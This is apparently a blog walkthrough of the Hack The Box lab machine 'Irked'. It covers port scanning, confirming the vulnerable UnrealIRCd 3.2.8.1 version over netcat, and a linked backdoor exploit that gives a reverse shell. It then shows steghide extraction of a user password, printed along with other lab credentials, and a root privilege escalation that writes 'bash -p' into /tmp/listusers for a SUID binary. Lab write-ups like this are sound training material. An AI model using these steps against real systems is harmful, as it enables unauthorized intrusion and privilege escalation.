---
title: "HTB - Irked"
categories: [box]
date: 2022-12-08
comments: true
image: /images/walkthroughs/hackthebox/irked/logo.png
favicon: /images/walkthroughs/hackthebox/irked/logo.png
description: HTB - Irked walkthrough
---

# Irked 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/banner.png" width="70%"/>
</p>


## Summary

Irked is an easy box where we find a static website wit not to much info (at a first glance) and a vulnerable version of UnrealIRCd. We can get the version from the displayed banner after login with any username in the service using netcat. Then using an exploit for the specific version in the box we get into the machine as ircd. Enumerating the system we find a .backup file with a password and a hint about stego. We grabt eh photo in the website and using steghide we retrieve a txt file with the password for _djmardov_. Log in as that user using ssh and grab the user flag.

For privilege escalation we find a SUID binary called _viewuser_. Analyzing its content we see that will execute the content of _/tmp/userlist_ file, therefore we write in there a set of commands and finally get a root shell by executing _viewuser_ binary.


## Enumeration


- nmap

```bash
Nmap scan report for 10.129.228.49
Host is up (0.050s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).'
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          51384/tcp6  status
|   100024  1          57101/udp   status
|   100024  1          57907/udp6  status
|_  100024  1          59157/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
59157/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have an static website serving a photo and IRC is almos working...

<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/1_0_web.png" width="90%"/>
</p>

- gobuster


```bash
feroxbuster -u "http://10.129.228.49" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 --depth 2

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.49
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        3l        7w       72c http://10.129.228.49/
403      GET       11l       32w      297c http://10.129.228.49/.htaccess
403      GET       11l       32w      292c http://10.129.228.49/.hta
403      GET       11l       32w      297c http://10.129.228.49/.htpasswd
200      GET        3l        7w       72c http://10.129.228.49/index.html
301      GET        9l       28w      315c http://10.129.228.49/manual => http://10.129.228.49/manual/
403      GET       11l       32w      304c http://10.129.228.49/manual/.htpasswd
403      GET       11l       32w      304c http://10.129.228.49/manual/.htaccess
403      GET       11l       32w      299c http://10.129.228.49/manual/.hta
403      GET       11l       32w      301c http://10.129.228.49/server-status
301      GET        9l       28w      318c http://10.129.228.49/manual/da => http://10.129.228.49/manual/da/
301      GET        9l       28w      318c http://10.129.228.49/manual/de => http://10.129.228.49/manual/de/
301      GET        9l       28w      318c http://10.129.228.49/manual/en => http://10.129.228.49/manual/en/
301      GET        9l       28w      318c http://10.129.228.49/manual/es => http://10.129.228.49/manual/es/
301      GET        9l       28w      318c http://10.129.228.49/manual/fr => http://10.129.228.49/manual/fr/
301      GET        9l       28w      322c http://10.129.228.49/manual/images => http://10.129.228.49/manual/images/
200      GET       13l       26w      626c http://10.129.228.49/manual/index.html
301      GET        9l       28w      318c http://10.129.228.49/manual/ja => http://10.129.228.49/manual/ja/
301      GET        9l       28w      318c http://10.129.228.49/manual/ko => http://10.129.228.49/manual/ko/
301      GET        9l       28w      321c http://10.129.228.49/manual/style => http://10.129.228.49/manual/style/
301      GET        9l       28w      318c http://10.129.228.49/manual/tr => http://10.129.228.49/manual/tr/
301      GET        9l       28w      321c http://10.129.228.49/manual/zh-cn => http://10.129.228.49/manual/zh-cn/
```

From website enumeration we get open apache directories for documentation.


We can see that UnrealIRCd. Looking for extra enumertaion I found some nmap scripts:


```bash
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6697,8067,65534 10.129.228.49
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-09 06:00 EST
Nmap scan report for 10.129.228.49
Host is up (0.043s latency).

PORT      STATE  SERVICE VERSION
194/tcp   closed irc
6697/tcp  open   irc     UnrealIRCd (Admin email djmardov@irked.htb)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.2] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
8067/tcp  open   irc     UnrealIRCd (Admin email djmardov@irked.htb)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.2] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
65534/tcp open   irc     UnrealIRCd (Admin email djmardov@irked.htb)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.2] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
```

Let's take note of user **djmardov**


We can log into the IRC server and see the version on the header. That version seems to be vulnerable to a [Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/):


<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/1_1_irc.png" width="90%"/>
</p>

The default password for IRC is **wealllikedebian**

```bash
nc -vn 10.129.228.49 6697                                                                                  
(UNKNOWN) [10.129.228.49] 6697 (ircs-u) open
:irked.htb NOTICE AUTH :*** Looking up your hostname...
USER djmardov
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead'
:irked.htb 461  USER :Not enough parameters
USER djmardov 0 * kashmirpass
NICK kashmir
:irked.htb 001 kashmir :Welcome to the ROXnet IRC Network kashmir!djmardov@10.10.14.2
:irked.htb 002 kashmir :Your host is irked.htb, running version Unreal3.2.8.1
:irked.htb 003 kashmir :This server was created Mon May 14 2018 at 13:12:50 EDT

```

So we confirm the vulnerable version and search for an exploit. I found the [following python script](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) and use it to get the revshell:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/2_0_in.png" width="90%"/>
</p>

Let's enumerate the machine. On the keys directory we find the following information (taking notes for later use (?): 

```bash
ircd@irked:~/Unreal3.2/keys/CVS$ cat Root
cat Root
:pserver:anonymous@cvs.unrealircd.com:/cvs
ircd@irked:~/Unreal3.2/keys/CVS$ cat Tag
cat Tag
Tstable
ircd@irked:~/Unreal3.2/keys/CVS$ cat Repository
cat Repository
unreal/keys
ircd@irked:~/Unreal3.2/keys/CVS$ cat Entries
cat Entries
/.KEYS/1.1.6.5/Sat Apr 24 23:53:53 2004//Tstable
D
```

Messing around with files I find this backup file with a funky password or what looks like stego password.

```bash
ircd@irked:/home/djmardov$ find / -type f -user djmardov -perm /444 2> /dev/null 
/home/djmardov/.profile
/home/djmardov/Documents/.backup
/home/djmardov/.ICEauthority
/home/djmardov/.bash_logout
/home/djmardov/.bashrc
/home/djmardov/user.txt


ircd@irked:/home/djmardov$ cat /home/djmardov/Documents/.backup 
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

There it is our friend Stego0o0o0o0. The only thing I found I can mess around with is the image in the web, let's give it a try with the most used tool, steghide:


```bash
kali@kali:~/Desktop/HackTheBox/Irked$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".
                                                                                                                                                                      
kali@kali:~/Desktop/HackTheBox/Irked$ cat pass.txt                                              
Kab6h+m+bbp2J:HG
```

Lucky us, we got a password (?)

**djmardov:Kab6h+m+bbp2J:HG**


## Privesc

<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/5_0_lin.png" width="90%"/>
</p>

The binary file outputs the following message:

```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2022-12-09 05:55 (:0)
djmardov pts/1        2022-12-09 06:56 (10.10.14.2)
sh: 1: /tmp/listusers: not found
```

Instead of throwing payloads, revshell or anything there, let's analyze the binary. I brought it to my machine (using a simple python3 -m http.server) and use cutter and radare2 to anylize it:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/6_0_cutter.png" width="90%"/>
</p>

We can see two calls to system function and a setuid in between. First call is _system('who')_ which prints information about logged in users. Then it call _setuid(0)_ which grants the binary root permissions (can be done since the binary is owned by root and it has the SUID permission). Then another _system('/tmp/listusers')_.
I placed a breakpoint before the second system function to confirm this behaviour:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/6_1_r2.png" width="90%"/>
</p>


Once confirmed I set the content of _/tmp/listusers_ to:


```bash
cat /root/root.txt
bash -p
```

Then run the script and get a root shell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/irked/7_0_root.png" width="90%"/>
</p>